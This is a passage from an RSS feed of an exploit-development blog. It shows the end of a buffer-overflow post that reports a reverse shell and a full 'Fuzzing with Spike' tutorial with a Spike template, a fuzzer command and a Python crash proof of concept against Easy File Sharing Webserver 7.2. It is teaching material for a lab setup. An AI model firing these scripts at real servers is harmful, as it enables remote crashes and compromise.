&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Email=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;getPassword=Get+Password&quot;&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In both cases firing this at our development Windows 7 box results in a reverse Shell!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Stack/r00t.png&quot; alt=&quot;r00t&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Fri, 13 Apr 2018 01:04:23 +1000</pubDate>
        <link>http://localhost:4000/2018/stack-overflow/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/stack-overflow/</guid>
        
        <category>BoF,</category>
        
        <category>Stack</category>
        
        <category>overflow,</category>
        
        <category>EggHunter,</category>
        
        <category>Shellcode</category>
        
        
        <category>BoF,</category>
        
        <category>Fuzzing</category>
        
      </item>
    
      <item>
        <title>Fuzzing with Spike</title>
        <description>&lt;p&gt;There has always been something about buffer overflows that to me has been what hacking is all about. There is something
magical about sending a string of characters and forcing a system to do your bidding. Hacking in its purest form!&lt;/p&gt;

&lt;p&gt;During the next few posts we are going to do just that. We are going to go from discovering a vulnerability all the way 
to exploit development, starting with a basic vanilla stack overflow (and a few twists), getting fancier with subsequent posts. Having said that, 
This is not a beginner friendly tutorial - you should have at least a basic grasp of memory layouts (and a very basic 
grasp of C woudnt hurt!). We are going to be focusing on Intel x86 processors, with a Windows operating system (touching
on linux at some point…)
If you havent already, i strongly recommend reading Aleph One’s famous &lt;a href=&quot;http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf&quot;&gt;Smashing the Stack for Fun and Profit&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;With that out of the way, lets begin! Today we are going to be ‘discovering’ a vulnerability and using the PoC as a basis for writing an exploit
for Easy File Sharing Webserver 7.2 down the road. I chose this software because 1) it is a simple remote unauthenticated example
of a stack overflow and 2) there are a few different ways we can hit this target. I did NOT discover this vulnerability, 
but we are going to approach it from an 0day angle and write a fuzzer to find it. This will be an overly simplistic approach to fuzzing and 0day discovery but it
should illustrate the basic steps you need to go through.&lt;/p&gt;

&lt;p&gt;If you’d like to follow along, install the above software on a Windows 7 Professional (x86) system. You will also need
to install a windows debugger. For this post I will use Immunity with the mona.py script. Make sure port 80 is reachable
from your attacking system.&lt;/p&gt;

&lt;p&gt;The first thing we’d wana do is get to know the software. We are looking to find out how it works, what kind of input
it takes, what protocol it uses, what it does, etc. In this case we know the software is a webserver, so
we would use a web proxy such as burp and browse the application. Note that any field that takes user input could be a point of interest - It is our job
to find that one oversight, that one unsanitized or unchecked parameter being passed into system(), strcpy(), sprintf(),
etc.In the case of a web server, some of the parameters of interest in would be custom headers, cookie
fields, or any user supplied/controlled data passed to the application.&lt;/p&gt;

&lt;p&gt;The particular vulnerability we are going to be exploiting today was found in the following POST request:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;POST /sendmail.ghp HTTP/1.1&lt;/code&gt;&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;Email=test@crash.com&amp;amp;getPassword=Get+Password&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;Email&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;getPassword&lt;/code&gt; parameters look promising, so lets write a template to fuzz these. Fuzzing is the process
by which we purposely send malformed requests of different input and study how the applciation responds. 
The fuzzer we are going to use today is the Spike fuzzer. Spike is a great tool which allows us to create templates 
based on the sort of data we are looking to send. We can then send both TCP or UDP packets containing the malformed data,
depending on what we are fuzzing. In this case, we are going to send a wide range of strings into the fields above.&lt;/p&gt;

&lt;p&gt;The tempalte we will use will look like the one below:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;s_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST /sendmail.ghp HTTP/1.1 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Email=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s_string_variable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;test@crash.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;getPassword=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s_string_variable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Get+Password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Copy paste the above template and save it as EFS.spk. To explain:&lt;/p&gt;

&lt;p&gt;The first line, &lt;code class=&quot;highlighter-rouge&quot;&gt;s_string()&lt;/code&gt; sends data of type string that is static. In the above example, we are sending a POST request to sendmail.ghp.
If we however wanted to fuzz the POST parameter, or the /sendmail.ghp, we would use the s_string_variable() definition.
This tells spike which variables we would like to fuzz, and it is here where all the malformed data will be sent.&lt;/p&gt;

&lt;p&gt;In the above example we are dealing with strings in an HTTP request. Spike also supports other data types such as binary,
but for this example we’ll keep it simple and stick to strings.&lt;/p&gt;

&lt;p&gt;Ok, now we are ready to test! We are going to use the generic_send_tcp program (part of Spike) as we are going to be sending TCP packets.
The command’s format is the following:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;generic_send_tcp 192.168.56.101 80 EFS.spk 0 0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;While most of the parameters above should be self explanatory, the last two tell spike which variable and which test
to start from. In this case we want spike to test all the variables in the template using all the payloads, so we’ll
start at 0 for both.&lt;/p&gt;

&lt;p&gt;On your Windows VM, start the Easy File Web Server, and launch Immunity. Attach the process by going to
file &amp;gt; Attach &amp;gt; fsws &amp;gt; click Attach. You will then need to click the play button above twice to resume program
execution.&lt;/p&gt;

&lt;p&gt;We will also use wireshark to monitor which payloads are sent to the windows machine. With wireshark running,
it is now time to fuzz the application. Open a separate terminal and launch the fuzzer. We notice that almost
immediately the application crashes! This looks promising. We stop Spike and look in wireshark to determine which payload
crashed the application. We see the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Fuzz/Wireshark-fuzz.png&quot; alt=&quot;Wireshark payloads&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we look at Spike, it tells us the second request sent a payload of 5004 bytes. Lets explore this crash a bit more and see
if it is indeed exploitable. Remember that not every crash is exploitable, for a wide variety of reasons.&lt;/p&gt;

&lt;p&gt;We will use the following python script as a baseline for our exploit:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Usage: python EFS.py [IP]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;i.e python  EFS.py 192.168.56.101&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;4144&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST /sendmail.ghp HTTP/1.1 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Email=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;getPassword=Get+Password&quot;&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before we continue, some of you may have noticed I’ve adjusted the payload length to 4144. This was done by playing
with the buffer length to more easily demonstrate the basics of exploit development. In post number 3 we will come back to the original payload length and 
cover Safe Exception Handler (SEH) exploit development.&lt;/p&gt;

&lt;p&gt;If we fire the above at our server, our application crashes, and immunity shows us the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Fuzz/immunity-fuzz-crash.png&quot; alt=&quot;We have an overwrite&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Success! it looks like we found a pretty straight forward exploitable flaw.&lt;/p&gt;

&lt;p&gt;In the next post, we will cover exploit development for this particular vulnerability, using the above skeleton exploit
as a starting point.&lt;/p&gt;

</description>
        <pubDate>Wed, 11 Apr 2018 01:04:23 +1000</pubDate>
        <link>http://localhost:4000/2018/fuzzing-with-spike/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/fuzzing-with-spike/</guid>
        
        <category>BoF,</category>
        
        <category>Fuzzing,</category>
        
        <category>Spike</category>
        
        
        <category>BoF,</category>
        
        <category>Fuzzing</category>
        
      </item>
    
  </channel>
</rss>
